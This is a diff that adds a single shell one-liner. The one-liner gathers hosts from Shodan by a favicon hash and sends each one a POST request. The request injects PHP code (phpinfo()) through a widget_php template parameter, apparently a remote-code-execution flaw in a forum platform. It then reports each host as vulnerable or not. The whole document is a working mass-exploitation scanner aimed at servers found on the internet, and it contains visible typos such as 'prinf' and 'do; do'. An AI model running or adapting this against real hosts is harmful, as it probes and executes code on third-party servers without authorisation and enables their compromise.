@@ -1,1 +1,1 @@
-
+shodan search http.favicon.hash:-601665621 --fields ip_str,port --seperator " " | awk '{print $1":"$2}' | while read host do; do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0] [template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \prinf "$host \033[0;31mVulnerable\n" ||printf "$host \033[0;32mNot Vulnerable\n";done;
